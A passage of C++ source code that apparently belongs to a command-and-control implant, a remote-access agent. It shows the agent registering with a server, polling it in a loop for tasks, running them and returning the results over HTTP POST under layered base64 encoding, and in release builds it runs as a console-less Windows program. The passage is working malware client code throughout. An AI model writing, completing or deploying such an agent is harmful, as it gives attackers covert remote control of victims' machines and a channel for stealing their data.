		result.status = 7;
		result.output = "Task type not recognized";
		break;
	}
	return result;
}

void SendTaskResponse(const json &task, const TaskResult &tr) {
	json responseData = {
		{"id", task["id"]},
		{"agent_id", agent_id},
		{"result", base64_encode(tr.output)},
		{"status", tr.status}
	};
	std::string encodedData = base64_encode(responseData.dump());
	json payload = {
		{"ht", 3},
		{"data", encodedData}
	};
	std::string encodedPayload = base64_encode(payload.dump());
	json finalRequest = { {"d", encodedPayload} };
	std::string requestBody = finalRequest.dump();

	PRINTF("[DEBUG] Response Data (Before Base64 Encoding): %s\n", responseData.dump().c_str());
	PRINTF("[DEBUG] Encoded Data: %s\n", encodedData.c_str());
	PRINTF("[DEBUG] Final Payload: %s\n", requestBody.c_str());

	std::string response;
	if (sendHttpPost(requestBody, response)) {
		PRINTF("[DEBUG] Task result sent. Server response: %s\n", response.c_str());
	}
	else {
		CERR("[ERROR] Failed to send task response\n");
	}
}

void PollForTasks() {
	json requestData = { {"agent_id", agent_id} };
	std::string encoded_data = base64_encode(requestData.dump());
	json request_data = {
		{"data", encoded_data},
		{"ht", 2}
	};
	std::string encoded_request = base64_encode(request_data.dump());
	json final_payload = { {"d", encoded_request} };
	std::string requestBody = final_payload.dump();
	std::string response;
	if (sendHttpPost(requestBody, response)) {
		json responseJson = json::parse(response);
		if (responseJson.contains("data")) {
			std::string decodedResponse = base64_decode(responseJson["data"].get<std::string>());
			json task = json::parse(decodedResponse);
			if (!task.empty()) {
				PRINTF("[DEBUG] Task received: %s\n", task.dump().c_str());
				TaskResult tr = ExecuteTask(task);
				SendTaskResponse(task, tr);
			}
			else {
				if (VERBOSE)
					PRINTF("[DEBUG] No task available.\n");
			}
		}
	}
}


// ------------------ Main Loop ------------------
#ifdef _DEBUG
int main(void)
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
#endif
{

	if (!RegisterWithServer()) {
		// In release mode, don't print to console
#ifdef _DEBUG
		CERR("[-] Registration failed. Exiting.\n");
#endif
		ExitProcess(0);
	}

	srand((unsigned int)time(NULL));

	while (true) {
		PollForTasks();
		Sleep(SLEEP_TIME * 1000);
	}

	return 0;
}
